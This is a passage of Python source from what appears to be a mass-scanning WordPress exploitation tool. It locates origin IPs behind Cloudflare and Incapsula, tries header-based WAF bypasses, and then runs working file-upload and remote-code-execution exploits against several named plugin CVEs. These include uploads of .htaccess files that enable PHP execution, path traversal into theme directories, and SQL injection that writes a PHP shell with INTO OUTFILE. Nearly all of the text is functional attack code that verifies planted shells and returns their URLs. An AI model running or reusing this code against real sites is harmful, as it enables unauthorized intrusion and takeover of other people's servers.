        f"ftp.{root}", f"cpanel.{root}", f"whm.{root}", f"webmail.{root}",
        f"direct.{root}", f"origin.{root}", f"server.{root}",
        f"admin.{root}", f"host.{root}", f"ns1.{root}", f"ns2.{root}",
        root,           # bare domain (no www) may not be proxied
        hostname,       # www version might still be origin in partial setup
    ]

    seen: set = set()
    candidates: list[str] = []

    loop = asyncio.get_event_loop()

    async def _check(h: str) -> None:
        ips = await _resolve_host(h)
        for ip in ips:
            if ip not in seen:
                seen.add(ip)
                if not _is_cf_ip(ip):
                    candidates.append(ip)
                    print(f"[elfinder] origin leak via {h} → {ip}", flush=True)

    await asyncio.gather(*[_check(h) for h in probe_hosts], return_exceptions=True)
    return candidates


_waf_context_cache: dict[str, tuple[str, dict]] = {}
_WAF_CACHE_MAX = 2_000  # evict oldest entries beyond this to bound memory on /16 scans


async def _resolve_waf_context(
    pm: "ProxyManager",
    base_url: str,
    probe_path: str = "/wp-login.php",
) -> tuple[str, dict]:
    """Probe for WAF and return (effective_base_url, extra_headers).

    Tier 1: direct request — if clean, returns (base_url, {})
    Tier 2: header injection — if a bypass set works, returns (base_url, bypass_headers)
    Tier 3: origin-IP — if raw origin responds, returns (scheme://origin_ip, {Host: host, ...})

    Results are cached per hostname so each host is probed at most once per scan.
    """
    from urllib.parse import urlparse as _urlparse
    hostname = _urlparse(base_url).netloc

    if hostname in _waf_context_cache:
        return _waf_context_cache[hostname]

    # Evict oldest half when cache grows too large to bound memory on /16 scans
    if len(_waf_context_cache) >= _WAF_CACHE_MAX:
        for k in list(_waf_context_cache)[:_WAF_CACHE_MAX // 2]:
            del _waf_context_cache[k]

    probe_url = base_url + probe_path
    st0, raw0, hdrs0 = -1, "", {}
    try:
        async with pm.request(
            "GET", probe_url,
            headers={"User-Agent": _WP_UA},
            timeout=aiohttp.ClientTimeout(total=8, sock_connect=3),
            ssl=False, allow_redirects=False,
        ) as resp:
            st0 = resp.status
            raw0 = (await resp.content.read(2048)).decode("utf-8", errors="replace")
            hdrs0 = dict(resp.headers)
    except Exception:
        _waf_context_cache[hostname] = (base_url, {})
        return base_url, {}

    cf_blocked = st0 == 403 and _is_cloudflare_response(hdrs0, raw0)
    inc_blocked = _is_incapsula_block(st0, raw0)

    if not cf_blocked and not inc_blocked:
        _waf_context_cache[hostname] = (base_url, {})
        return base_url, {}

    waf_type = "cloudflare" if cf_blocked else "incapsula"
    print(f"[waf] {waf_type} detected on {hostname}, probing bypass", flush=True)

    # Tier 2: header injection sets
    for bypass_hdrs in _WAF_BYPASS_HEADER_SETS:
        try:
            async with pm.request(
                "GET", probe_url,
                headers={"User-Agent": _WP_UA, **bypass_hdrs},
                timeout=aiohttp.ClientTimeout(total=8, sock_connect=3),
                ssl=False, allow_redirects=False,
            ) as resp2:
                st2 = resp2.status
                raw2 = (await resp2.content.read(2048)).decode("utf-8", errors="replace")
                hdrs2 = dict(resp2.headers)
            if not _is_cloudflare_response(hdrs2, raw2) and not _is_incapsula_block(st2, raw2):
                print(f"[waf] header injection bypass for {hostname}: {bypass_hdrs}", flush=True)
                _waf_context_cache[hostname] = (base_url, bypass_hdrs)
                return base_url, bypass_hdrs
        except Exception:
            continue

    # Tier 3: origin-IP
    origin_ips = await _find_origin_ip(hostname)
    print(f"[waf] trying origin IPs for {hostname}: {origin_ips}", flush=True)
    for origin_ip in origin_ips:
        for scheme in ("https", "http"):
            origin_probe = f"{scheme}://{origin_ip}{probe_path}"
            try:
                async with pm.request(
                    "GET", origin_probe,
                    headers={**_WP_BROWSER_HEADERS, "Host": hostname},
                    timeout=aiohttp.ClientTimeout(total=8, sock_connect=3),
                    ssl=False, allow_redirects=False,
                ) as resp3:
                    st3 = resp3.status
                    raw3 = (await resp3.content.read(2048)).decode("utf-8", errors="replace")
                if st3 not in (-1, 404) and not _is_waf_challenge(raw3) and not _is_incapsula_block(st3, raw3):
                    print(f"[waf] origin bypass: {origin_ip} ({scheme}) for {hostname}", flush=True)
                    eff_base = f"{scheme}://{origin_ip}"
                    bh = {**_WP_BROWSER_HEADERS, "Host": hostname}
                    _waf_context_cache[hostname] = (eff_base, bh)
                    return eff_base, bh
            except Exception:
                continue

    print(f"[waf] no bypass found for {hostname}", flush=True)
    _waf_context_cache[hostname] = (base_url, {})
    return base_url, {}


async def _test_elfinder_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2020-25213: POST PHP probe to elFinder connector, return shell URL or None."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    base_name = f"wp_health_{format(random.randint(0, 0xFFFFFFFF), '08x')}"
    connector_path = vuln["upload_endpoint"]
    shell_dir = vuln["shell_dir"]

    hostname = base_url.split("://", 1)[-1].split("/")[0].split(":")[0]

    connector_paths = [
        connector_path,
        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "/wp-content/plugins/wp-file-manager/connector.php",
        "/wp-content/plugins/wp-file-manager/lib/php/connector%2Eminimal.php",
        "/wp-content/plugins/wp-file-manager/lib/php/./connector.minimal.php",
        "/wp-content//plugins/wp-file-manager/lib/php/connector.minimal.php",
    ]

    eff_alt = eff.replace("http://", "https://") if eff.startswith("http://") \
              else eff.replace("https://", "http://")

    seen_endpoints: set = set()
    endpoint_pairs = []
    for cp in connector_paths:
        for b in (eff, eff_alt):
            ep = b + cp
            if ep not in seen_endpoints:
                seen_endpoints.add(ep)
                endpoint_pairs.append((ep, b))

    for endpoint, ep_base in endpoint_pairs:
        async def _post_raw(form, _ep=endpoint, extra_headers: dict = None) -> tuple:
            hdrs = {"Host": hostname, "User-Agent": _WP_UA, **bh}
            if extra_headers:
                hdrs.update(extra_headers)
            try:
                async with pm.request(
                    "POST", _ep, data=form,
                    headers=hdrs,
                    timeout=aiohttp.ClientTimeout(total=15, sock_connect=3),
                    ssl=False, allow_redirects=False,
                ) as resp:
                    raw = (await resp.read()).decode("utf-8", errors="replace")
                    return resp.status, raw, dict(resp.headers)
            except Exception as exc:
                return -1, str(exc), {}

        def _upload_form(upload_filename: str, content: bytes, ctype: str = "application/octet-stream"):
            f = aiohttp.FormData()
            f.add_field("cmd", "upload")
            f.add_field("target", "l1_Lw==")
            f.add_field("upload[]", io.BytesIO(content), filename=upload_filename, content_type=ctype)
            return f

        probe_form = _upload_form("test.txt", b"probe", "text/plain")
        st0, raw0, hdrs0 = await _post_raw(probe_form)
        print(f"[elfinder] {endpoint} probe → HTTP {st0} | {raw0[:120]!r}", flush=True)

        if st0 in (-1, 301, 302, 307, 308, 403, 404, 410):
            continue
        if st0 == 200 and _is_waf_challenge(raw0):
            print(f"[elfinder] WAF challenge persists at {endpoint} despite bypass — skipping", flush=True)
            continue

        # Use cmd=open to get the connector-reported URL for lib/files/ — this is the
        # only reliable way to get the actual domain when base_url is an IP (shared hosting).
        # If the connector is patched (returns empty for everything), we detect that here.
        open_form = aiohttp.FormData()
        open_form.add_field("cmd", "open")
        open_form.add_field("target", "l1_Lw==")
        open_form.add_field("init", "1")
        _, open_raw, _ = await _post_raw(open_form)
        print(f"[elfinder] open → {open_raw[:200]!r}", flush=True)

        # If the probe AND cmd=open both return 200 with empty body, the connector
        # is a hot-patched no-op (hosting provider silently neutralised it while
        # leaving the file in place). Skip all upload attempts for this endpoint.
        if not raw0 and not open_raw:
            print(f"[elfinder] connector appears hot-patched (200 empty for probe+open) — skipping", flush=True)
            continue

        # Determine the URL base for exec checks
        check_base = base_url  # default — may be overridden below
        if open_raw:
            try:
                od = json.loads(open_raw)
                cwd_url = od.get("cwd", {}).get("url", "")
                if cwd_url and "://" in cwd_url:
                    # connector reported the actual URL — extract origin
                    from urllib.parse import urlparse as _up
                    _p = _up(cwd_url)
                    check_base = f"{_p.scheme}://{_p.netloc}"
                    print(f"[elfinder] canonical base from connector: {check_base}", flush=True)
            except Exception:
                pass
        if check_base == base_url:
            # Fallback: scrape the WordPress homepage for a wp-content URL to extract domain
            _, _hp = await _wp_get(pm, eff + "/", bypass_headers=bh, timeout=5)
            if _hp:
                _m = re.search(r'https?://([a-zA-Z0-9][\w.-]+)/wp-content/', _hp)
                if _m and _m.group(1) != hostname:
                    _scheme = "https" if base_url.startswith("https") else "http"
                    check_base = f"{_scheme}://{_m.group(1)}"
                    print(f"[elfinder] canonical base from homepage: {check_base}", flush=True)

        htaccess = (
            b"Options -Indexes\n"
            b"AddType application/x-httpd-php .php .phar .php5 .phtml\n"
            b"AddHandler application/x-httpd-php .php .phar .php5 .phtml\n"
            b"Order Allow,Deny\n"
            b"Allow from all\n"
        )
        ht_st, ht_raw, _ = await _post_raw(_upload_form(".htaccess", htaccess, "text/plain"))
        print(f"[elfinder] .htaccess upload → {ht_st} | {ht_raw[:80]!r}", flush=True)

        for ext in (".php", ".phar", ".php5", ".phtml"):
            probe_name = base_name + ext
            mk_form = aiohttp.FormData()
            mk_form.add_field("cmd", "mkfile")
            mk_form.add_field("name", probe_name)
            mk_form.add_field("target", "l1_Lw==")
            mk_st, mk_raw, _ = await _post_raw(mk_form)
            print(f"[elfinder] mkfile {probe_name} → {mk_st} | {mk_raw[:120]!r}", flush=True)

            file_hash = ""
            try:
                mk_data = json.loads(mk_raw)
                added = mk_data.get("added", [])
                if added:
                    file_hash = added[0].get("hash", "")
            except Exception:
                pass
            if not file_hash and mk_st == 200:
                import base64 as _b64
                file_hash = "l1_" + _b64.urlsafe_b64encode(probe_name.encode()).decode().rstrip("=")

            if file_hash:
                put_form = aiohttp.FormData()
                put_form.add_field("cmd", "put")
                put_form.add_field("target", file_hash)
                put_form.add_field("content[]", _WP_PROBE_PHP.decode())
                put_st, put_raw, _ = await _post_raw(put_form)
                print(f"[elfinder] put → {put_st} | {put_raw[:80]!r}", flush=True)

                check_url = check_base + shell_dir + probe_name
                st, body = await _wp_get(pm, check_url, bypass_headers=bh, timeout=8)
                print(f"[elfinder] exec check → {st} ({check_url})", flush=True)
                if st == 200 and _WP_PROBE_TOKEN in body:
                    return check_url

        for ext in (".php", ".phar", ".php5", ".phtml"):
            probe_name = base_name + ext
            up_st, up_raw, _ = await _post_raw(_upload_form(probe_name, _WP_PROBE_PHP))
            print(f"[elfinder] upload {probe_name} → {up_st} | {up_raw[:120]!r}", flush=True)
            if up_st != 200:
                continue
            if up_raw:
                try:
                    up_data = json.loads(up_raw)
                    if not up_data.get("added"):
                        continue
                except Exception:
                    continue

            check_url = check_base + shell_dir + probe_name
            st, body = await _wp_get(pm, check_url, bypass_headers=bh, timeout=8)
            print(f"[elfinder] exec check → {st} ({check_url})", flush=True)
            if st == 200 and _WP_PROBE_TOKEN in body:
                return check_url

        for cand in _wp_date_candidates("/wp-content/uploads/", base_name + ".php"):
            st2, b2 = await _wp_get(pm, check_base + cand, bypass_headers=bh, timeout=6)
            if st2 == 200 and _WP_PROBE_TOKEN in b2:
                return check_base + cand

    return None


async def _test_cf7_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2020-35489: find a CF7 form, upload PHP probe via REST/AJAX endpoint."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    for path in ("/", "/contact", "/contact-us", "/get-in-touch"):
        status, body = await _wp_get(pm, eff + path, bypass_headers=bh, timeout=8)
        if status != 200 or "wpcf7-form" not in body:
            continue

        # Extract form ID and unit tag from hidden fields
        form_id_m = re.search(r'<input[^>]+name=["\']_wpcf7["\'][^>]+value=["\'](\d+)["\']', body)
        if not form_id_m:
            form_id_m = re.search(r'data-wpcf7-id=["\'](\d+)["\']', body)
        if not form_id_m:
            continue
        form_id = form_id_m.group(1)

        unit_tag_m = re.search(r'<input[^>]+name=["\']_wpcf7_unit_tag["\'][^>]+value=["\']([^"\']+)["\']', body)
        unit_tag = unit_tag_m.group(1) if unit_tag_m else f"wpcf7-f{form_id}-p1-o1"

        # Need a file input on the form — order-independent: find any <input> with type="file"
        file_field = ""
        for inp in re.finditer(r'<input([^>]+)>', body, re.IGNORECASE):
            attrs = inp.group(1)
            if re.search(r'type=["\']file["\']', attrs, re.IGNORECASE):
                nm = re.search(r'name=["\']([^"\']+)["\']', attrs)
                if nm:
                    file_field = nm.group(1)
                    break
        if not file_field:
            continue

        filename = _wp_probe_filename()

        # Try REST API endpoint first (CF7 ≥ 5.x), fall back to admin-ajax (CF7 < 5.x)
        for endpoint, extra_fields in (
            (
                f"/wp-json/contact-form-7/v1/contact-forms/{form_id}/feedback",
                {"_wpcf7": form_id, "_wpcf7_version": "5.3",
                 "_wpcf7_unit_tag": unit_tag, "_wpcf7_locale": "en_US"},
            ),
            (
                "/wp-admin/admin-ajax.php",
                {"action": "wpcf7_ajax_onsubmit", "_wpcf7": form_id,
                 "_wpcf7_unit_tag": unit_tag, "_wpcf7_locale": "en_US"},
            ),
        ):
            form = aiohttp.FormData()
            for k, v in extra_fields.items():
                form.add_field(k, v)
            form.add_field(
                file_field,
                io.BytesIO(_WP_PROBE_PHP),
                filename=filename,
                content_type="application/octet-stream",
            )
            try:
                async with pm.request(
                    "POST", eff + endpoint, data=form,
                    headers={"User-Agent": _WP_UA, **bh},
                    timeout=aiohttp.ClientTimeout(total=15, sock_connect=5),
                    ssl=False,
                ) as resp:
                    await resp.read()
            except Exception:
                continue

            # CF7 drops uploads in wpcf7_uploads/ or the standard yearly/monthly path
            for candidate in (
                f"{vuln['shell_dir']}wpcf7_uploads/{filename}",
                *_wp_date_candidates(vuln["shell_dir"], filename),
            ):
                shell_url = base_url + candidate
                st, body2 = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=8)
                if st == 200 and _WP_PROBE_TOKEN in body2:
                    return shell_url

    return None


async def _test_forminator_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-28890: find a Forminator form, upload PHP probe, return shell URL."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    for path in ("/", "/contact", "/contact-us"):
        status, body = await _wp_get(pm, eff + path, bypass_headers=bh, timeout=8)
        if status != 200 or "forminator-form" not in body:
            continue
        form_id_m = re.search(r'data-form-id=["\'](\d+)["\']', body)
        if not form_id_m:
            continue
        form_id = form_id_m.group(1)
        file_m = re.search(r'name=["\'](upload-[^"\']+|file-[^"\']+)["\']', body)
        file_field = file_m.group(1) if file_m else "file-1"

        # Forminator's AJAX handler verifies a nonce before processing the upload.
        # It's embedded as data-nonce on the form wrapper, or in the JS config object.
        nonce_m = (
            re.search(r'data-nonce=["\']([^"\']+)["\']', body)
            or re.search(r'"nonce"\s*:\s*"([^"]+)"', body)
            or re.search(r'forminatorFront\s*[,{][^}]*"nonce"\s*:\s*"([^"]+)"', body)
        )
        forminator_nonce = nonce_m.group(1) if nonce_m else ""

        filename = _wp_probe_filename()
        form = aiohttp.FormData()
        form.add_field("action", "forminator_submit_form")
        form.add_field("form_id", form_id)
        form.add_field("forminator_nonce", forminator_nonce)
        form.add_field(
            file_field,
            io.BytesIO(_WP_PROBE_PHP),
            filename=filename,
            content_type="image/jpeg",
        )
        try:
            async with pm.request(
                "POST", eff + vuln["upload_endpoint"], data=form,
                headers={"User-Agent": _WP_UA, **bh},
                timeout=aiohttp.ClientTimeout(total=15, sock_connect=5),
                ssl=False,
            ) as resp:
                await resp.read()
        except Exception:
            continue

        for candidate in (
            f"{vuln['shell_dir']}{filename}",       # flat: /wp-content/uploads/forminator/probe.php
            *_wp_date_candidates(vuln["shell_dir"], filename),
        ):
            shell_url = base_url + candidate
            st, body2 = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=8)
            if st == 200 and _WP_PROBE_TOKEN in body2:
                return shell_url

    return None


async def _test_profilepress_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2021-34621: upload PHP probe as registration avatar, return shell URL."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    import string as _str
    rnd = ''.join(random.choices(_str.ascii_lowercase, k=10))
    filename = _wp_probe_filename()

    reg_path = None
    reg_body = ""
    for path in ("/?page=pp-user-registration", "/register/", "/register", "/registration/"):
        st, body = await _wp_get(pm, eff + path, bypass_headers=bh, timeout=10)
        if st == 200 and body and "profilepress" in body.lower():
            reg_path, reg_body = path, body
            break
    if not reg_path:
        return None

    nonce_m = re.search(
        r'name=["\']pp[_-]?nonce["\'][^>]+value=["\']([^"\']+)["\']', reg_body
    )
    nonce = nonce_m.group(1) if nonce_m else ""

    form = aiohttp.FormData()
    form.add_field("user_login", f"u{rnd}")
    form.add_field("user_email", f"u{rnd}@probe.local")
    form.add_field("user_pass", f"Pr0be!{rnd[:6]}")
    form.add_field("user_pass2", f"Pr0be!{rnd[:6]}")
    if nonce:
        form.add_field("pp_nonce", nonce)
    form.add_field("pp-submit-user-registration", "1")
    form.add_field(
        "profile-avatar",
        io.BytesIO(_WP_PROBE_PHP),
        filename=filename,
        content_type="image/jpeg",
    )
    try:
        async with pm.request(
            "POST", eff + reg_path, data=form,
            headers={"User-Agent": _WP_UA, **bh},
            allow_redirects=True,
            timeout=aiohttp.ClientTimeout(total=20, sock_connect=5),
            ssl=False,
        ) as resp:
            await resp.read()
    except Exception:
        return None

    for candidate in (
        f"/wp-content/uploads/userfiles/{filename}",
        f"/wp-content/uploads/pp-user-avatars/{filename}",
        *_wp_date_candidates("/wp-content/uploads/", filename),
    ):
        st2, b2 = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=8)
        if st2 == 200 and b2 and _WP_PROBE_TOKEN in b2:
            return base_url + candidate
    return None


_WP_COMMON_THEMES = (
    "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
    "twentytwentytwo", "twentytwentyone", "twentytwenty", "twentynineteen",
    "astra", "generatepress", "hello-elementor", "oceanwp", "storefront",
    "divi", "avada", "kadence",
)


async def _wp_detect_theme_slugs(pm: ProxyManager, base_url: str) -> list:
    """Return theme slug candidates: active theme first, then common defaults."""
    slugs: list = []
    try:
        st, body = await _wp_get(pm, base_url + "/", timeout=8)
        if st == 200 and body:
            for m in re.finditer(r'/wp-content/themes/([^/"\'> ]+)/', body):
                slug = m.group(1)
                if slug not in slugs:
                    slugs.append(slug)
    except Exception:
        pass
    for t in _WP_COMMON_THEMES:
        if t not in slugs:
            slugs.append(t)
    return slugs


async def _test_backup_migration_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2023-6553: BMPath header PHP inclusion writes probe file to uploads/ or theme dir."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()
    endpoint = eff + vuln["upload_endpoint"]
    theme_slugs = await _wp_detect_theme_slugs(pm, base_url)

    # Build PHP array of destination directories to try: uploads/ first, then active theme.
    # Using SCRIPT_FILENAME (= header.php path) to traverse 4 levels up to wp-content/.
    # Writes until one succeeds and echoes the successful path so we can check the right URL.
    shell_b64 = base64.b64encode(_WP_PROBE_PHP).decode()
    theme_entries = "".join(
        f"$wpc.'/themes/{s}/'," for s in theme_slugs[:5]
    )
    write_payload = (
        "<?php "
        "$wpc=dirname(dirname(dirname(dirname($_SERVER['SCRIPT_FILENAME']))));"
        f"$f=base64_decode('{shell_b64}');"
        f"foreach(array($wpc.'/uploads/',{theme_entries}) as $d){{"
        f"if(@file_put_contents($d.'{filename}',$f)!==false){{echo $d;break;}}}}"
        "exit; ?>"
    ).encode()

    try:
        async with pm.request(
            "POST", endpoint,
            data=write_payload,
            headers={
                "User-Agent": _WP_UA,
                "Content-Type": "text/plain",
                "BMPath": "php://input",
                **bh,
            },
            timeout=aiohttp.ClientTimeout(total=15, sock_connect=5),
            ssl=False,
        ) as resp:
            await resp.read()
    except Exception:
        return None

    # Check uploads/ first, then all theme candidates
    candidates = [
        vuln["shell_dir"] + filename,
        f"/wp-content/uploads/{filename}",
    ] + [f"/wp-content/themes/{s}/{filename}" for s in theme_slugs[:5]]
    for candidate in candidates:
        shell_url = base_url + candidate
        st, body = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=8)
        if st == 200 and body and _WP_PROBE_TOKEN in body:
            return shell_url
    return None


async def _test_dnd_cf7_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2025-14842: Drag and Drop Multiple File Upload for CF7 — extension bypass.

    The addon's upload handler validates extensions but omits .phar and others.
    File lands in wp-content/uploads/dnd-cf7-upload/YYYY/MM/.
    On PHP-FPM hosts we also upload a .htaccess to force phar execution.
    """
    eff = eff_base or base_url
    bh = bypass_headers or {}
    base_name = f"wp_health_{format(random.randint(0, 0xFFFFFFFF), '08x')}"

    # Fetch pages to extract dnd_cf7 nonce and real CF7 form_id.
    nonce = ""
    form_id = "1"
    page_paths = ("/", "/contact", "/contact-us", "/contact-form", "/reach-us",
                  "/get-in-touch", "/support", "/inquiry", "/enquiry")
    for path in page_paths:
        st, body = await _wp_get(pm, eff + path, bypass_headers=bh, timeout=6)
        if st != 200 or not body:
            continue
        body_lc = body.lower()
        if "dnd_cf7" not in body_lc and "dnd-cf7" not in body_lc and "codedropz" not in body_lc:
            continue
        m = re.search(r'"nonce"\s*:\s*"([^"]{8,})"', body)
        if not m:
            m = re.search(r"['\"]nonce['\"]\s*:\s*['\"]([a-f0-9]{10})['\"]", body)
        if m:
            nonce = m.group(1)
        fid_m = re.search(r'<input[^>]+name=["\']_wpcf7["\'][^>]+value=["\'](\d+)["\']', body)
        if not fid_m:
            fid_m = re.search(r'data-id=["\'](\d+)["\']', body)
        if not fid_m:
            fid_m = re.search(r'wpcf7-f(\d+)', body)
        if fid_m:
            form_id = fid_m.group(1)
        break

    eff_alt = (
        eff.replace("http://", "https://") if eff.startswith("http://")
        else eff.replace("https://", "http://")
    )

    upload_base = "/wp-content/uploads/dnd-cf7-upload/"

    async def _dnd_upload(action: str, ep_base: str, filename: str, content: bytes,
                          ctype: str = "application/octet-stream") -> tuple[bool, str]:
        """Upload a file via DnD CF7 AJAX. Returns (accepted, raw_response)."""
        form = aiohttp.FormData()
        form.add_field("action", action)
        form.add_field("nonce", nonce)
        form.add_field("form_id", form_id)
        form.add_field("file", io.BytesIO(content), filename=filename, content_type=ctype)
        try:
            async with pm.request(
                "POST", ep_base + "/wp-admin/admin-ajax.php", data=form,
                headers={"User-Agent": _WP_UA, **bh},
                timeout=aiohttp.ClientTimeout(total=15, sock_connect=3),
                ssl=False, allow_redirects=False,
            ) as resp:
                if resp.status in (301, 302, 307, 308):
                    return False, f"redirect:{resp.status}"
                raw = (await resp.read()).decode("utf-8", errors="replace")
                if raw.strip() in ("0", "-1", ""):
                    return False, raw.strip()
                return True, raw
        except Exception as exc:
            return False, str(exc)

    # Extensions to try in order — many old versions of the plugin only block a
    # small set (.php, .php3, .php4, .php5, .exe) but not .phar/.php7/.php8/.phtml
    probe_exts = (".phar", ".php7", ".php8", ".phtml", ".php5")

    for action in ("dnd_cf7_upload", "dnd_codedropz_upload"):
        for ep_base in (eff, eff_alt):
            last_ok_filename = None
            last_ok_raw = ""
            for ext in probe_exts:
                filename = base_name + ext
                ok, raw = await _dnd_upload(action, ep_base, filename, _WP_PROBE_PHP)
                print(f"[dnd_cf7] {action} {ext} → ok={ok} | {raw[:120]!r}", flush=True)
                if not ok:
                    if "redirect" in raw:
                        break  # wrong scheme — try alt_base
                    continue

                # Check if server returned a direct URL we can verify immediately.
                # data field may be a string (error message) or a dict — handle both.
                try:
                    j = json.loads(raw)
                    data_field = j.get("data")
                    url_in_data = data_field.get("url", "") if isinstance(data_field, dict) else ""
                    if not j.get("success") and not url_in_data:
                        continue  # upload explicitly failed
                    url_from_resp = (
                        url_in_data or j.get("url", "") or j.get("file", "")
                    )
                    if isinstance(url_from_resp, str) and url_from_resp.startswith("http"):
                        st2, chk = await _wp_get(pm, url_from_resp, bypass_headers=bh, timeout=6)
                        print(f"[dnd_cf7] direct url check → {st2}", flush=True)
                        if st2 == 200 and _WP_PROBE_TOKEN in chk:
                            return url_from_resp
                except json.JSONDecodeError:
                    # raw is HTML — the AJAX endpoint returned a page, not an upload
                    # response. The file was never written; skip this extension.
                    continue

                last_ok_filename = filename
                last_ok_raw = raw

            if not last_ok_filename:
                continue

            # Upload a .htaccess to enable PHP/phar execution via AddHandler —
            # covers Apache setups where .htaccess overrides are allowed.
            htaccess_content = (
                b"AddHandler application/x-httpd-php .phar .php7 .php8 .phtml .php5\n"
                b"AddType application/x-httpd-php .phar .php7 .php8 .phtml .php5\n"
                b"Options -Indexes\n"
            )
            ht_ok, ht_raw = await _dnd_upload(action, ep_base, ".htaccess",
                                               htaccess_content, "text/plain")
            print(f"[dnd_cf7] .htaccess upload → ok={ht_ok} | {ht_raw[:80]!r}", flush=True)

            # Check all known date-based paths for the probe file.
            # Always use base_url (original domain) — the file is written relative
            # to the WordPress docroot, not the bypass IP used for the upload.
            for candidate in _wp_date_candidates(upload_base, last_ok_filename):
                st3, chk3 = await _wp_get(pm, base_url + candidate, bypass_headers=bh, timeout=6)
                print(f"[dnd_cf7] check {candidate} → {st3}", flush=True)
                if st3 == 200 and _WP_PROBE_TOKEN in chk3:
                    return base_url + candidate

    return None


async def _test_mec_import_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2021-24145: upload PHP probe via Modern Events Calendar ICS import."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    base_name = f"wp_health_{format(random.randint(0, 0xFFFFFFFF), '08x')}"
    theme_slugs = await _wp_detect_theme_slugs(pm, base_url)
    mec_actions = ["mec_import_data", "mec_import", "mec_ics_import"]

    for ext in (".php", ".phar", ".php5", ".phtml"):
        filename = base_name + ext
        # Try plain upload first; then path-traversal into theme dirs (always executes PHP)
        filename_targets: list = [(filename, vuln["shell_dir"] + filename)]
        for slug in theme_slugs[:4]:
            t_name = f"../../../themes/{slug}/{filename}"
            filename_targets.append((t_name, f"/wp-content/themes/{slug}/{filename}"))

        for action in mec_actions:
            for upload_filename, web_path in filename_targets:
                form = aiohttp.FormData()
                form.add_field("action", action)
                form.add_field(
                    "mec_ics_file",
                    io.BytesIO(_WP_PROBE_PHP),
                    filename=upload_filename,
                    content_type="text/calendar",
                )
                try:
                    async with pm.request(
                        "POST", eff + vuln["upload_endpoint"], data=form,
                        headers={"User-Agent": _WP_UA, **bh},
                        timeout=aiohttp.ClientTimeout(total=15, sock_connect=3),
                        ssl=False, allow_redirects=False,
                    ) as resp:
                        body_txt = (await resp.read()).decode("utf-8", errors="replace")
                        print(f"[mec] {action} {upload_filename} → HTTP {resp.status} | {body_txt[:120]!r}", flush=True)
                        if body_txt.strip() == "-1" or "invalid_action" in body_txt:
                            break
                except Exception as e:
                    print(f"[mec] {action} {upload_filename} → error: {e}", flush=True)
                    continue

                candidates = [web_path]
                if upload_filename == filename:
                    candidates += list(_wp_date_candidates("/wp-content/uploads/mec-ics-files/", filename))
                    candidates += list(_wp_date_candidates("/wp-content/uploads/", filename))
                for candidate in candidates:
                    st, body = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=6)
                    print(f"[mec] check {candidate} → {st}", flush=True)
                    if st == 200 and body and _WP_PROBE_TOKEN in body:
                        return base_url + candidate
    return None


async def _test_wp_automatic_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-27956: SQL injection in csv.php → INTO OUTFILE PHP shell."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()
    theme_slugs = await _wp_detect_theme_slugs(pm, base_url)

    web_roots = (
        "/var/www/html/",
        "/var/www/",
        "/srv/www/htdocs/",
        "/usr/share/nginx/html/",
        "/home/www/",
    )

    # Build write targets: try uploads/ first across all roots, then theme dirs.
    # Theme dirs bypass .htaccess PHP-blocking in uploads/.
    write_targets: list = []
    for root in web_roots:
        write_targets.append((
            f"{root}wp-content/uploads/{filename}",
            f"/wp-content/uploads/{filename}",
        ))
    for root in web_roots:
        for slug in theme_slugs[:3]:
            write_targets.append((
                f"{root}wp-content/themes/{slug}/{filename}",
                f"/wp-content/themes/{slug}/{filename}",
            ))

    hex_payload = _WP_PROBE_PHP.hex()
    for outfile, web_path in write_targets:
        sql = f"SELECT 0x{hex_payload} INTO OUTFILE '{outfile}'"
        try:
            async with pm.request(
                "POST", eff + vuln["upload_endpoint"],
                data={"q": sql},
                headers={"User-Agent": _WP_UA, **bh},
                timeout=aiohttp.ClientTimeout(total=12, sock_connect=5),
                ssl=False,
            ) as resp:
                await resp.read()
        except Exception:
            continue

        shell_url = base_url + web_path
        st, body = await _wp_get(pm, eff + web_path, bypass_headers=bh, timeout=8)
        if st == 200 and body and _WP_PROBE_TOKEN in body:
            return shell_url

    return None


async def _wp_theme_editor_inject(
    pm: ProxyManager, base_url: str, cookie_str: str,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """Inject a trigger-based PHP shell into the active theme's functions.php via the
    WordPress theme editor, then return a URL that executes the shell.

    WordPress's media uploader blocks .php uploads for everyone including admin, so
    for admin-level exploits we inject into an existing theme file instead.

    Returns shell URL of the form base_url + '/?wpprobe_XXXX=1' or None.
    """
    eff = eff_base or base_url
    bh = bypass_headers or {}
    token = format(random.randint(0, 0xFFFFFFFF), '08x')
    trigger_param = f"wpprobe_{token}"

    # Detect active theme slug and fetch functions.php in parallel:
    # fire themes.php + 4 common default theme slugs simultaneously so we
    # don't wait for themes.php to round-trip before trying the editor.
    _COMMON_THEMES = ("twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwenty")
